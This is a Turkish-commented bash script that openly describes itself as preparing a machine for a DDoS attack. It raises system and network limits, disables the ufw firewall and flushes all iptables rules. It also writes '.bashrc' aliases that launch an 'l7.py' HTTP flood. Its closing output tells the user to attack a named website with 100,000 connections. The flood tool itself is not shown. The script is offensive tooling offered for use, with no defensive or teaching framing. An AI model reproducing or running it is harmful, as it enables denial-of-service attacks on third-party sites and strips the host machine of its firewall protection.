#!/bin/bash

# ==============================================
# OPTIMIZER.SH - Makineyi DDoS İçin Hazırlar
# Kullanım: chmod +x optimizer.sh && ./optimizer.sh
# ==============================================

echo "[+] Sistem optimizasyonu başlıyor..."

# Root kontrolü
if [ "$EUID" -eq 0 ]; then 
    echo "[✓] Root yetkisi var - tam optimizasyon yapılıyor"
    ROOT_MODE=1
else
    echo "[!] Root yetkisi yok - kullanıcı bazlı optimizasyon yapılıyor"
    ROOT_MODE=0
fi

# 1. File descriptor limitini arttır (en önemli)
echo "[+] File descriptor limiti arttırılıyor..."
ulimit -n 1048576 2>/dev/null
ulimit -s unlimited 2>/dev/null
ulimit -i unlimited 2>/dev/null
ulimit -u unlimited 2>/dev/null

# Kalıcı yap (root varsa)
if [ $ROOT_MODE -eq 1 ]; then
    echo "* soft nofile 1048576" >> /etc/security/limits.conf 2>/dev/null
    echo "* hard nofile 1048576" >> /etc/security/limits.conf 2>/dev/null
    echo "root soft nofile 1048576" >> /etc/security/limits.conf 2>/dev/null
    echo "root hard nofile 1048576" >> /etc/security/limits.conf 2>/dev/null
fi

# 2. Socket buffer boyutlarını şişir
echo "[+] Socket buffer'ları optimize ediliyor..."
if [ $ROOT_MODE -eq 1 ]; then
    # Root ayarları
    sysctl -w net.core.rmem_max=134217728 >/dev/null 2>&1
    sysctl -w net.core.wmem_max=134217728 >/dev/null 2>&1
    sysctl -w net.core.rmem_default=16777216 >/dev/null 2>&1
    sysctl -w net.core.wmem_default=16777216 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_rmem="4096 87380 134217728" >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_wmem="4096 65536 134217728" >/dev/null 2>&1
    sysctl -w net.core.optmem_max=134217728 >/dev/null 2>&1
    sysctl -w net.core.netdev_max_backlog=500000 >/dev/null 2>&1
else
    # User mode - sadece geçici ayarlar
    echo 1048576 > /proc/sys/net/core/rmem_max 2>/dev/null
    echo 1048576 > /proc/sys/net/core/wmem_max 2>/dev/null
fi

# 3. TCP optimizasyonları
echo "[+] TCP stack optimize ediliyor..."
if [ $ROOT_MODE -eq 1 ]; then
    sysctl -w net.ipv4.tcp_timestamps=0 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_sack=0 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_dsack=0 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_low_latency=1 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_syn_retries=2 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_synack_retries=2 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_tw_reuse=1 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_tw_recycle=1 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_fin_timeout=5 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_keepalive_time=30 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_keepalive_probes=2 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_keepalive_intvl=2 >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_max_syn_backlog=65535 >/dev/null 2>&1
    sysctl -w net.core.somaxconn=65535 >/dev/null 2>&1
    sysctl -w net.ipv4.ip_local_port_range="1024 65535" >/dev/null 2>&1
    sysctl -w net.ipv4.tcp_max_tw_buckets=2000000 >/dev/null 2>&1
fi

# 4. EPHEMERAL port range genişlet
echo "[+] Port aralığı genişletiliyor..."
if [ $ROOT_MODE -eq 1 ]; then
    echo "1024 65535" > /proc/sys/net/ipv4/ip_local_port_range 2>/dev/null
fi

# 5. Sistem parametreleri
echo "[+] Sistem parametreleri ayarlanıyor..."
if [ $ROOT_MODE -eq 1 ]; then
    sysctl -w kernel.threads-max=1000000 >/dev/null 2>&1
    sysctl -w vm.max_map_count=1000000 >/dev/null 2>&1
    sysctl -w kernel.pid_max=1000000 >/dev/null 2>&1
    sysctl -w fs.file-max=1048576 >/dev/null 2>&1
    sysctl -w fs.nr_open=1048576 >/dev/null 2>&1
fi

# 6. Mevcut limitleri göster
echo ""
echo "[✓] Mevcut limitler:"
echo "    File Descriptors: $(ulimit -n)"
echo "    Stack Size: $(ulimit -s)"
echo "    Max User Processes: $(ulimit -u)"
if [ $ROOT_MODE -eq 1 ]; then
    echo "    Port Range: $(cat /proc/sys/net/ipv4/ip_local_port_range 2>/dev/null)"
fi

# 7. Python optimizasyonu (önemli amk)
echo ""
echo "[+] Python performansı arttırılıyor..."
export PYTHONOPTIMIZE=1
export PYTHONHASHSEED=random
export PYTHONUNBUFFERED=1
export PYTHONIOENCODING=utf-8

# Bash profile'a ekle
echo "export PYTHONOPTIMIZE=1" >> ~/.bashrc 2>/dev/null
echo "export PYTHONUNBUFFERED=1" >> ~/.bashrc 2>/dev/null

# 8. Network interface optimizasyonu
echo "[+] Network interface'leri optimize ediliyor..."
if [ $ROOT_MODE -eq 1 ]; then
    for iface in $(ls /sys/class/net/ | grep -v lo); do
        # IRQ coalescing
        echo 0 > /sys/class/net/$iface/queues/rx-0/rx_coalesce_usecs 2>/dev/null
        echo 0 > /sys/class/net/$iface/queues/tx-0/tx_coalesce_usecs 2>/dev/null
        
        # Buffer boyutları
        ip link set dev $iface txqueuelen 100000 2>/dev/null
    done
fi

# 9. RAM optimizasyonu
echo "[+] RAM/swappiness optimize ediliyor..."
if [ $ROOT_MODE -eq 1 ]; then
    sysctl -w vm.swappiness=10 >/dev/null 2>&1
    sysctl -w vm.vfs_cache_pressure=50 >/dev/null 2>&1
    sysctl -w vm.dirty_ratio=40 >/dev/null 2>&1
    sysctl -w vm.dirty_background_ratio=5 >/dev/null 2>&1
fi

# 10. CPU governor (varsa)
echo "[+] CPU governor ayarlanıyor..."
if [ $ROOT_MODE -eq 1 ] && [ -f /sys/devices/system/cpu/cpu0/cpufreq/scaling_governor ]; then
    for cpu in /sys/devices/system/cpu/cpu*/cpufreq/scaling_governor; do
        echo "performance" > $cpu 2>/dev/null
    done
fi

# 11. Transparent Huge Pages kapat (hafif performans)
echo "[+] THP kapatılıyor..."
if [ $ROOT_MODE -eq 1 ] && [ -f /sys/kernel/mm/transparent_hugepage/enabled ]; then
    echo never > /sys/kernel/mm/transparent_hugepage/enabled 2>/dev/null
    echo never > /sys/kernel/mm/transparent_hugepage/defrag 2>/dev/null
fi

# 12. Interrupt affinity (varsa)
echo "[+] IRQ affinity ayarlanıyor..."
if [ $ROOT_MODE -eq 1 ] && command -v irqbalance >/dev/null; then
    systemctl start irqbalance 2>/dev/null
fi

# 13. Zone reclaim
if [ $ROOT_MODE -eq 1 ]; then
    sysctl -w vm.zone_reclaim_mode=0 >/dev/null 2>&1
fi

# 14. Firewall varsa geçici devre dışı (dene)
echo "[+] Firewall kontrolü..."
if [ $ROOT_MODE -eq 1 ]; then
    if command -v ufw >/dev/null; then
        ufw disable 2>/dev/null
    fi
    if command -v iptables >/dev/null; then
        iptables -F 2>/dev/null
        iptables -X 2>/dev/null
        iptables -t nat -F 2>/dev/null
        iptables -t mangle -F 2>/dev/null
    fi
fi

# 15. .bashrc'ye alias ekle (kolaylık olsun)
echo "" >> ~/.bashrc 2>/dev/null
echo "# L7 DDoS aliases" >> ~/.bashrc 2>/dev/null
echo "alias l7-max='python3 l7.py http://hedef.com 100000 300 GET 500'" >> ~/.bashrc 2>/dev/null
echo "alias l7-test='python3 l7.py http://test.com 5000 30 GET 100'" >> ~/.bashrc 2>/dev/null
echo "alias optimize='bash optimizer.sh'" >> ~/.bashrc 2>/dev/null

echo ""
echo -e "\033[0;32m[✓] OPTİMİZASYON TAMAM!\033[0m"
echo "    Şimdi şu komutla saldırabilirsin:"
echo "    python3 l7.py https://hacktivizm.org/ 100000 300 GET 500"
echo ""
echo "    Yeni ayarları aktif etmek için:"
echo "    source ~/.bashrc"
echo ""

if [ $ROOT_MODE -eq 0 ]; then
    echo -e "\033[0;33m[!] Root olmadan bazı ayarlar yapılamadı!\033[0m"
    echo "    Maksimum performans için root olarak çalıştır:"
    echo "    sudo ./optimizer.sh"
fi
